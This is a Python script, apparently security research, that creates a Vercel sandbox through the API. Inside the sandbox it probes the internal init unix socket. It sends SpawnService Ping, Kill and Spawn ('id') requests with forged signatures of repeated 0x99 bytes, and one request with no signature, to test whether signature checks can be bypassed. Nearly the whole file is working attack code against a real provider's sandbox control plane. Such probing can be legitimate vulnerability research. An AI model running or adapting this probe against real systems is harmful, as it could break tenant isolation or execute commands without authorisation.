# 实验J77: 未 patch 对照 —— 证明 Ping/Kill/Spawn 签名保护的差异
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj77"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, re, struct, subprocess, ctypes, socket, base64, time, json

def sigcall(path, body=b"{}", ctype="application/connect+json", timeout=8):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: " + ctype,
           "-H", "Connect-Protocol-Version: 1",
           "-H", "x-timestamp: " + str(int(time.time() * 1000)),
           "-H", "x-signature: " + base64.b64encode(b"\x99" * 64).decode(),
           "--data-binary", "@-", "http://localhost" + path]
    try:
        r = subprocess.run(cmd, input=body, capture_output=True, timeout=timeout + 2)
        return r.stdout.decode("latin1", "replace")
    except Exception as e:
        return "EXC " + str(e)

def ev(out):
    idx = out.find("\r\n\r\n")
    body = out[idx+4:] if idx >= 0 else out
    return body.replace("\r\n", " | ")[:400]

print("== 未 patch 对照 (任意签名) ==", flush=True)
# Ping
out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}")
print("[Ping {}] %s" % ev(out), flush=True)
out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Ping", b"\x00\x00\x00\x00\x00", "application/connect+proto")
print("[Ping proto] %s" % ev(out), flush=True)
# Kill 空 body
out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Kill", b"{}")
print("[Kill {}] %s" % ev(out), flush=True)
# Kill 带 processId (随便编一个)
kreq = json.dumps({"processId": "proc_999"}).encode()
kbody = b"\x00" + struct.pack(">I", len(kreq)) + kreq
out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Kill", kbody)
print("[Kill proc_999] %s" % ev(out), flush=True)
# Spawn 对照
req = json.dumps({"command": "id"}).encode()
env_body = b"\x00" + struct.pack(">I", len(req)) + req
out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", env_body)
print("[Spawn id] %s" % ev(out), flush=True)
# 无签名头
cmd = ["curl", "-sS", "--max-time", "8", "-i", "-X", "POST",
       "--unix-socket", "/run/vercel/share/init.sock",
       "-H", "Content-Type: application/connect+json",
       "-H", "Connect-Protocol-Version: 1",
       "--data-binary", "@-", "http://localhost/vercel.sandbox.spawn.v1.SpawnService/Ping"]
r = subprocess.run(cmd, input=b"{}", capture_output=True, timeout=10)
print("[Ping 无签名头] %s" % ev(r.stdout.decode("latin1", "replace")), flush=True)
"""
run_cmd(sid, PROBE, "nopatch-control", wait=True, timeout=120000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
